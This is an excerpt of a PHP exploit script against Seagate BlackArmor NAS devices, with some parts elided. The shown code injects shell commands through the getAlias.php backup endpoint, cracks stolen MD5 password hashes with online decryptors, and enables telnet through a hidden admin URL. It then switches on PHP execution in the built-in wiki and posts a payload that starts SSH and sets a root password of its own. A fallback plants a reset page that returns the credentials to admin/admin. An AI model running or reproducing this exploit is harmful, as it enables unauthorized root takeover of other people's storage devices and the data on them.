...
function authenticate($url, $username, $password) {
  ...
  curl_setopt($ch, CURLOPT_POSTFIELDS, "p_user=" . $username . "&p_pass=" . $password);
...
function RemoteCodeExec($url, $command) {
     $url = $url . "/backupmgt/getAlias.php?ip=" . urlencode("xx /etc/passwd; ") . urlencode($command) . ";";
     $handle = fopen($url, "r");
}
...
if ($http_status == "404") {
	echo "[Error]: The page was not found! Are you sure this is a Seagate BlackArmor NAS?\n";
	die();
}
...
if ($pwdcount == 0) {
	...
	foreach ($hashes as $hash) {
    		...
    		foreach($decryptors as $decrytor) {
        		if (NULL !== ($plain = MD5Decryptor::plain($hash[0], $decrytor))) {
            			echo " - found: $plain";
				$pwdcount++;
...
if ($pwdcount != 0) {
  ...
  if ($telnet_status == "reachable") {
	echo "- The telnet daemon is already running: [skipped]\n";
      ...
      if(trim($line) != "yes"){
          ...
          curl_setopt($ch, CURLOPT_URL, $url . "/admin/sxmJEWAB/SXMjewab.php?telnet=jewab&debug=1");
  ...
  if ($wiki == "yes") {
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'enablewiki=yes&agree=yes&btn=Submit');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
  ...
  $sectok = getWikiSecurityToken($argv[1] . "/wiwiki/doku.php?do=login&id=start");
  ...
  if (isset($admin_found)) {
	echo "- Logging in to the wiki server       : ";
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "u=" . $telnet_user . "&p=" . $telnet_pass . "&sectok=" . $sectok ."&do=login&id=start");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	...
	$sectok = getWikiSecurityToken($url . "/wiwiki/doku.php?id=start&do=admin&page=config");
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "config[phpok]=1&sectok=" . $sectok . "&do=admin&page=config&save=1&submit=Save");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	...
	echo "- Rooting the NAS: \n";
	  ...
	  echo "- No root password chosen! Setting our own: '" . $root_password . "'\n";
        } else {
	   $root_password = preg_replace( "/\r|\n/", "", $line);
        ...
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "sectok=" . $sectok . "&id=playground:playground&do[save]=Save&wikitext=<php>exec(\"/usr/sbin/dropbear start;\"); exec(\"echo '" . $root_password . "' | passwd --stdin;\");</php>");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_AUTOREFERER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	...
	echo "- The devices is rooted! The password is: " . $root_password ."\n";
	echo "- The SSH daemon was also enabled!!\n\n";

  } else {
	echo "- Can't root the device due to lack of admin credentials\n";
        ...
        $httpResponseCode = RemoteFileExist($argv[1] . "/backupmgt/immediate_log/instance.log");

                if ($httpResponseCode == "200") {
                        RemoteCodeExec($argv[1], "sed '11,16d' /proto/SxM_webui/d41d8cd98f00b204e9800998ecf8427e.php > /proto/SxM_webui/reset.php");
                        RemoteCodeExec($argv[1], "chmod 755 /proto/SxM_webui/reset.php");

                        echo "- Now go to: " . $argv[1] . "/reset.php to reset the default credentials to admin/admin.\n";
                        exit;
                } else {
                        echo "Something went wrong, the HTTP error code is: " . $httpResponseCode . "\n"; 
                }
        } else {
                echo "Exit....\n";
                exit; 
